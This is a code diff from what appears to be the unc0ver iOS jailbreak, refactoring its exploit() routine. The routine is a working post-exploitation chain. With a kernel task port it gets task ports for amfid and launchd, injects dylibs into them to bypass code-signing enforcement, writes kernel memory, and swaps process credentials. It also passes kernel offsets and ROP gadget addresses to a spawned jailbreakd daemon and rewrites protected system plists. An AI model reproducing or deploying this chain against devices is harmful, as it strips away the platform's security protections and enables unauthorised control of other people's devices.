-            amfidPid = pidOfProcess("/usr/libexec/amfid");
+
+            pid_t amfidPid = pidOfProcess("/usr/libexec/amfid");
             LOG("amfidPid: " "0x%x" "\n", amfidPid);
             _assert(amfidPid > 1, message, true);
-            amfidProcAddr = getProcStructForPid(amfidPid);
+            uint64_t amfidProcAddr = getProcStructForPid(amfidPid);
             LOG("amfidProcAddr: " ADDR "\n", amfidProcAddr);
             _assert(ISADDR(amfidProcAddr), message, true);
             _assert(platformizeProcAtAddr(amfidProcAddr) == ERR_SUCCESS, message, true);
-            amfidTaskPort = proc_to_task_port(amfidProcAddr, myProcAddr);
+            task_t amfidTaskPort = proc_to_task_port(amfidProcAddr, myProcAddr);
             LOG("amfidTaskPort: " "0x%x" "\n", amfidTaskPort);
             _assert(MACH_PORT_VALID(amfidTaskPort), message, true);
             call_remote(amfidTaskPort, dlopen, 2, REMOTE_CSTRING(amfid_payload), REMOTE_LITERAL(RTLD_NOW));
@@ -2090,8 +2057,9 @@ void exploit(mach_port_t tfp0,
         if (!isJailbroken()) {
             LOG("Updating version string...");
             SETMESSAGE(NSLocalizedString(@"Failed to update version string.", nil));
+            struct utsname u;
             _assert(uname(&u) == ERR_SUCCESS, message, true);
-            kernelVersionString = (char *)[[NSString stringWithFormat:@"%s %s", u.version, DEFAULT_VERSION_STRING] UTF8String];
+            const char *kernelVersionString = [[NSString stringWithFormat:@"%s %s", u.version, DEFAULT_VERSION_STRING] UTF8String];
             for (int i = 0; !(i >= 5 || strstr(u.version, kernelVersionString) != NULL); i++) {
                 _assert(updateVersionString(kernelVersionString, tfp0, kernel_base) == ERR_SUCCESS, message, true);
                 _assert(uname(&u) == ERR_SUCCESS, message, true);
@@ -2109,16 +2077,17 @@ void exploit(mach_port_t tfp0,
         LOG("Extracting bootstrap...");
         SETMESSAGE(NSLocalizedString(@"Failed to extract bootstrap.", nil));
         if (needStrap) {
+            NSString *strap_tar = pathForResource(@"strap.tar.lzma");
+            _assert(strap_tar != nil, message, true);
             _assert(chdir("/") == ERR_SUCCESS, message, true);
-            strap_tar = pathForResource(@"strap.tar.lzma");
             rv = runCommand("/jb/tar", "--use-compress-program=/jb/lzma", "-xvpkf", [strap_tar UTF8String], NULL);
             _assert(rv == ENOENT || rv == ERR_SUCCESS, message, true);
             rv = system("/usr/libexec/cydia/firmware.sh");
             _assert(WEXITSTATUS(rv) == ERR_SUCCESS, message, true);
             extractResources();
-            rv = system("/usr/bin/dpkg --configure -a");
+            rv = runCommand("/usr/bin/dpkg", "--configure", "-a", NULL);
             _assert(WEXITSTATUS(rv) == ERR_SUCCESS, message, true);
-            run_uicache = true;
+            prefs.run_uicache = true;
             runCommand("/bin/rm", "-rf", "/jb/tar", NULL);
             runCommand("/bin/rm", "-rf", "/jb/lzma", NULL);
         } else {
@@ -2130,13 +2099,10 @@ void exploit(mach_port_t tfp0,
             }
         }
         if (access("/.installed_unc0ver", F_OK) != ERR_SUCCESS) {
-            a = fopen("/.installed_unc0ver", "w");
-            LOG("a: " "%p" "\n", a);
-            _assert(a != NULL, message, true);
-            _assert(fclose(a) == ERR_SUCCESS, message, true);
-            _assert(init_file("/.installed_unc0ver", 0, 0644), message, true);
+            _assert(create_file("/.installed_unc0ver", 0, 0644), message, true);
         }
         _assert(chdir("/jb") == ERR_SUCCESS, message, true);
+        char link[0x100];
         bzero(link, sizeof(link));
         if ((readlink("/electra", link, 0x9f) == -1) ||
             (strcmp(link, "/jb") != ERR_SUCCESS)) {
@@ -2164,11 +2130,7 @@ void exploit(mach_port_t tfp0,
             
             LOG("Disabling stashing...");
             SETMESSAGE(NSLocalizedString(@"Failed to disable stashing.", nil));
-            a = fopen("/.cydia_no_stash", "w");
-            LOG("a: " "%p" "\n", a);
-            _assert(a != NULL, message, true);
-            _assert(fclose(a) == ERR_SUCCESS, message, true);
-            _assert(init_file("/.cydia_no_stash", 0, 0644), message, true);
+            _assert(create_file("/.cydia_no_stash", 0, 0644), message, true);
             LOG("Successfully disabled stashing.");
         }
     }
@@ -2204,14 +2166,14 @@ void exploit(mach_port_t tfp0,
             access("/usr/libexec/substrate", F_OK) != ERR_SUCCESS) { // substrate must not be installed
             LOG("Spawning jailbreakd...");
             SETMESSAGE(NSLocalizedString(@"Failed to spawn jailbreakd.", nil));
-            jbdPidFile = "/var/tmp/jailbreakd.pid";
+            const char *jbdPidFile = "/var/tmp/jailbreakd.pid";
             if (!pidFileIsValid(@(jbdPidFile))) {
-                md = [NSMutableDictionary dictionary];
+                NSMutableDictionary *md = [NSMutableDictionary dictionary];
                 md[@"Label"] = @"jailbreakd";
                 md[@"Program"] = @"/usr/libexec/jailbreakd";
                 md[@"EnvironmentVariables"] = [NSMutableDictionary dictionary];
                 md[@"EnvironmentVariables"][@"KernelBase"] = ADDRSTRING(kernel_base);
-                md[@"EnvironmentVariables"][@"KernProcAddr"] = ADDRSTRING(ReadAnywhere64(GETOFFSET(kernproc)));
+                md[@"EnvironmentVariables"][@"KernProcAddr"] = ADDRSTRING(ReadKernel64(GETOFFSET(kernproc)));
                 md[@"EnvironmentVariables"][@"ZoneMapOffset"] = ADDRSTRING(GETOFFSET(zone_map_ref) - kernel_slide);
                 md[@"EnvironmentVariables"][@"AddRetGadget"] = ADDRSTRING(GETOFFSET(add_x0_x0_0x40_ret));
                 md[@"EnvironmentVariables"][@"OSBooleanTrue"] = ADDRSTRING(GETOFFSET(OSBoolean_True));
@@ -2249,18 +2211,20 @@ void exploit(mach_port_t tfp0,
     
     {
         // Patch launchd.
-        
-        if (load_tweaks && (access("/usr/libexec/substrate", F_OK) != ERR_SUCCESS) && !pspawnHookLoaded()) {
+        const pid_t launchdPid = 1;
+
+        if (prefs.load_tweaks && (access("/usr/libexec/substrate", F_OK) != ERR_SUCCESS) && !pspawnHookLoaded()) {
             LOG("Patching launchd...");
             SETMESSAGE(NSLocalizedString(@"Failed to patch launchd.", nil));
             _assert(clean_file("/var/log/pspawn_hook_launchd.log"), message, true);
             _assert(clean_file("/var/log/pspawn_hook_xpcproxy.log"), message, true);
             _assert(clean_file("/var/log/pspawn_hook_other.log"), message, true);
-            launchdProcAddr = getProcStructForPid(launchdPid);
+
+            uint64_t launchdProcAddr = getProcStructForPid(launchdPid);
             LOG("launchdProcAddr: " ADDR "\n", launchdProcAddr);
             _assert(ISADDR(launchdProcAddr), message, true);
             _assert(platformizeProcAtAddr(launchdProcAddr) == ERR_SUCCESS, message, true);
-            launchdTaskPort = proc_to_task_port(launchdProcAddr, myProcAddr);
+            task_t launchdTaskPort = proc_to_task_port(launchdProcAddr, myProcAddr);
             LOG("launchdTaskPort: " "0x%x" "\n", launchdTaskPort);
             _assert(MACH_PORT_VALID(launchdTaskPort), message, true);
             call_remote(launchdTaskPort, dlopen, 2, REMOTE_CSTRING("/usr/lib/pspawn_hook.dylib"), REMOTE_LITERAL(RTLD_NOW));
@@ -2274,7 +2238,7 @@ void exploit(mach_port_t tfp0,
     UPSTAGE();
     
     {
-        if (disable_app_revokes) {
+        if (prefs.disable_app_revokes) {
             // Disable app revokes.
             LOG("Disabling app revokes...");
             SETMESSAGE(NSLocalizedString(@"Failed to disable app revokes.", nil));
@@ -2302,7 +2266,7 @@ void exploit(mach_port_t tfp0,
         
         LOG("Allowing SpringBoard to show non-default system apps...");
         SETMESSAGE(NSLocalizedString(@"Failed to allow SpringBoard to show non-default system apps.", nil));
-        md = [NSMutableDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
+        NSMutableDictionary *md = [NSMutableDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
         _assert(md != nil, message, true);
         for (int i = 0; !(i >= 5 || [md[@"SBShowNonDefaultSystemApps"] isEqual:@YES]); i++) {
             _assert(kill(pidOfProcess("/usr/sbin/cfprefsd"), SIGSTOP) == ERR_SUCCESS, message, true);
@@ -2343,7 +2307,7 @@ void exploit(mach_port_t tfp0,
     UPSTAGE();
     
     {
-        if (disable_auto_updates) {
+        if (prefs.disable_auto_updates) {
             // Disable Auto Updates.
             
             LOG("Disabling Auto Updates...");
@@ -2380,15 +2344,16 @@ void exploit(mach_port_t tfp0,
     UPSTAGE();
     
     {
-        if (increase_memory_limit) {
+        if (prefs.increase_memory_limit) {
             // Increase memory limit.
             
             LOG("Increasing memory limit...");
             SETMESSAGE(NSLocalizedString(@"Failed to increase memory limit.", nil));
+            char buf_targettype[256];
             bzero(buf_targettype, sizeof(buf_targettype));
-            size = sizeof(buf_targettype);
+            size_t size = sizeof(buf_targettype);
             _assert(sysctlbyname("hw.targettype", buf_targettype, &size, NULL, 0) == ERR_SUCCESS, message, true);
-            md = [NSMutableDictionary dictionaryWithContentsOfFile:[NSString stringWithFormat:@"/System/Library/LaunchDaemons/com.apple.jetsamproperties.%s.plist", buf_targettype]];
+            NSMutableDictionary *md = [NSMutableDictionary dictionaryWithContentsOfFile:[NSString stringWithFormat:@"/System/Library/LaunchDaemons/com.apple.jetsamproperties.%s.plist", buf_targettype]];
             _assert(md != nil, message, true);
             md[@"Version4"][@"System"][@"Override"][@"Global"][@"UserHighWaterMark"] = [NSNumber numberWithInteger:[md[@"Version4"][@"PListDevice"][@"MemoryCapacity"] integerValue]];
             _assert(([md writeToFile:[NSString stringWithFormat:@"/System/Library/LaunchDaemons/com.apple.jetsamproperties.%s.plist", buf_targettype] atomically:YES]), message, true);
@@ -2399,7 +2364,7 @@ void exploit(mach_port_t tfp0,
     UPSTAGE();
     
     {
-        if (install_openssh) {
+        if (prefs.install_openssh) {
             // Install OpenSSH.
             LOG("Installing OpenSSH...");
             SETMESSAGE(NSLocalizedString(@"Failed to install OpenSSH.", nil));
@@ -2421,13 +2386,19 @@ void exploit(mach_port_t tfp0,
             // Remove Electra's Cydia.
             LOG("Removing Electra's Cydia...");
             SETMESSAGE(NSLocalizedString(@"Failed to remove Electra's Cydia.", nil));
-            rv = system("/usr/bin/dpkg --force-depends -r cydia-gui");
+            rv = runCommand("/usr/bin/dpkg", "--force-depends", "-r", "cydia-gui", NULL);
             _assert(WEXITSTATUS(rv) == ERR_SUCCESS, message, true);
-            install_cydia = true;
+            if (!prefs.install_cydia) {
+                prefs.install_cydia = true;
+                setPreference(@K_INSTALL_CYDIA, @YES);
+            }
             LOG("Successfully removed Electra's Cydia.");
         }
         if (access("/etc/apt/sources.list.d/electra.list", F_OK) == ERR_SUCCESS) {
-            install_cydia = true;
+            if (!prefs.install_cydia) {
+                prefs.install_cydia = true;
+                setPreference(@K_INSTALL_CYDIA, @YES);
+            }
         }
         if (compareInstalledVersion("mobilesubstrate", "eq", "99.0")) {
             LOG("Fixing version of Electra's mobilesubstrate dummy package.");
@@ -2437,7 +2408,7 @@ void exploit(mach_port_t tfp0,
         system("sed -ie '/^\\/sbin\\/fstyp/d' /Library/dpkg/info/firmware-sbin.list");
         // Unblock Saurik's repo if it is blocked.
         unblockDomainWithName("apt.saurik.com");
-        if (install_cydia) {
+        if (prefs.install_cydia) {
             // Install Cydia.
             
             LOG("Installing Cydia...");
@@ -2469,7 +2440,7 @@ void exploit(mach_port_t tfp0,
     UPSTAGE();
     
     {
-        if (load_daemons) {
+        if (prefs.load_daemons) {
             // Load Daemons.
             
             LOG("Loading Daemons...");
@@ -2492,7 +2463,7 @@ void exploit(mach_port_t tfp0,
     UPSTAGE();
     
     {
-        if (run_uicache) {
+        if (prefs.run_uicache) {
             // Run uicache.
             
             LOG("Running uicache...");
@@ -2511,7 +2482,7 @@ void exploit(mach_port_t tfp0,
         LOG("Dropping kernel credentials...");
         SETMESSAGE(NSLocalizedString(@"Failed to clean up.", nil));
         ShaiHuludProcessAtAddr(myProcAddr, myOriginalCredAddr);
-        WriteAnywhere64(GETOFFSET(shenanigans), Shenanigans);
+        WriteKernel64(GETOFFSET(shenanigans), Shenanigans);
         setuidProcessAtAddr(0, myProcAddr);
         ShaiHulud2ProcessAtAddr(myProcAddr);
         LOG("Successfully dropped kernel credentials.");
@@ -2520,12 +2491,12 @@ void exploit(mach_port_t tfp0,
     UPSTAGE();
     
     {
-        if (load_tweaks) {
+        if (prefs.load_tweaks) {
             // Load Tweaks.
             
             LOG("Loading Tweaks...");
             SETMESSAGE(NSLocalizedString(@"Failed to run ldrestart", nil));
-            if (reload_system_daemons) {
+            if (prefs.reload_system_daemons) {
                 rv = system("nohup bash -c \""
                              "launchctl unload /System/Library/LaunchDaemons/com.apple.backboardd.plist && "
                              "ldrestart ;"
